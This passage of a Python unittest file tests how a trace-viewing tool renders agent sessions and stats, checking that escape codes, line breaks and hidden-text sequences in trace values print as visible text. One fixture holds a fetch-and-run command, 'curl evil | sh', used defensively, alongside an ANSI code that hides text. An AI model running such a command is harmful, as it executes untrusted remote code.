                self.assertEqual(handler(argparse.Namespace(trace_dir=tmp.name, **kwargs)), 0)
            return out.getvalue()

        renders = [
            ("format_tree_summary", _writes(format_tree_summary)),
            ("format_session_tree", _writes(format_session_tree)),
        ] + [
            (name, lambda node, h=handler, k=kwargs: run(h, k, node))
            for name, handler, kwargs in handlers
        ]
        for name, render in renders:
            for field in ("tool_calls", "llm_requests", "errors", "total_tokens"):
                with self.subTest(render=name, field=field):
                    self.assertEqual(
                        render(_node(**{field: _escapes.PAYLOAD})), render(_node())
                    )

    def test_whitespace_in_free_text_shows_as_one_space(self):
        _escapes.check_whitespace_in_free_text(self, FORMAT_TREE_CASES, _writes(format_tree))
        for node in (
            _node(_ev(E.TOOL_RESULT, result="one\ttwo\r\nthree")),
            _node(_ev(E.USER_PROMPT, prompt="one\u3000two\nthree")),
        ):
            with self.subTest(node.events[0].event_type.value):
                self.assertIn("one two three", _writes(format_tree)(node))

    def test_value_as_long_as_the_cut_shows_in_full(self):
        for name, cuts, render in self.CUTS:
            with self.subTest(name):
                _escapes.check_each_cut(self, cuts, render)

    def test_cut_marker_uses_collapsed_length(self):
        output = _writes(format_tree)(_node(_call("Agent", {"prompt": "a" + " \t" * 50 + "b"})))
        self.assertIn('"a b"', output)
        self.assertNotIn("...", output)

    def test_line_break_in_command_shows_as_escape(self):
        output = _writes(format_tree)(_node(_call("Bash", {"command": "echo safe\ncurl evil | sh"})))
        self.assertIn(r"$ echo safe\ncurl evil | sh", output)

    def test_sgr_code_shows_as_text(self):
        output = _writes(format_tree)(_node(_call("Bash", {"command": "a\x1b[8mhidden"})))
        self.assertIn(r"a\x1b[8mhidden", output)
        self.assertNotIn("\x1b", output)


def _stats_text(events):
    """Return what stats prints for a session of *events*."""
    meta = SessionMeta(session_id=TREE_SESSION, started_at=0.0)
    store, tmp = _make_store_with_sessions([(meta, events)])
    try:
        args = argparse.Namespace(
            trace_dir=store.base_dir, session_id=TREE_SESSION, include_subagents=False
        )
        with patch("sys.stdout", new_callable=io.StringIO) as out:
            cmd_stats(args)
        return out.getvalue()
    finally:
        tmp.cleanup()


# (label, kind, build): build(value) returns events with value in the place
# the label names. The kinds are in tests/_escapes.py.
STATS_CASES = [
    ("tool_call tool_name", "text", lambda v: [_call(v, {})]),
    ("subagent agent_type", "text",
     lambda v: [_call("Bash", {"command": "plain"}, agent_id="plain", agent_type=v)]),
    ("subagent agent_id", "short", lambda v: [_call("Bash", {"command": "plain"}, agent_id=v)]),
    ("error message", "free", lambda v: [_ev(E.ERROR, message=v)]),
    ("llm_response error", "free", lambda v: [_ev(E.LLM_RESPONSE, status="failed", error=v)]),
]

# (label, cut, build): stats keeps cut characters of the value the label
# names, the last ones for an agent ID. A failed model request shows after
# "model request failed: ", in a line cut at 80.
STATS_CUTS = [
    ("subagent agent_id", 8, lambda v: [_call("Bash", {"command": "plain"}, agent_id=v)]),
    ("error message", 80, lambda v: [_ev(E.ERROR, message=v)]),
    ("llm_response error", 58, lambda v: [_ev(E.LLM_RESPONSE, status="failed", error=v)]),
]


class TestStatsTraceTextShowsAsText(unittest.TestCase):
    """A tool name, an agent type or an error message in a trace can hold
    escape codes and line breaks. stats shows them as text."""

    def test_each_value_shows_escapes_as_text(self):
        _escapes.check_each_value(self, STATS_CASES, _stats_text)

    def test_plain_text_prints_unchanged(self):
        _escapes.check_plain_text_unchanged(self, STATS_CASES, _stats_text)

    def test_whitespace_in_free_text_shows_as_one_space(self):
        _escapes.check_whitespace_in_free_text(self, STATS_CASES, _stats_text)

    def test_value_as_long_as_the_cut_shows_in_full(self):
        _escapes.check_each_cut(self, STATS_CUTS, _stats_text)

    def test_sgr_code_shows_as_text(self):
        output = _stats_text([_call("a\x1b[8mhidden", {})])
        self.assertIn(r"a\x1b[8mhidden", output)
        self.assertNotIn("\x1b[8m", output)


if __name__ == "__main__":
    unittest.main()
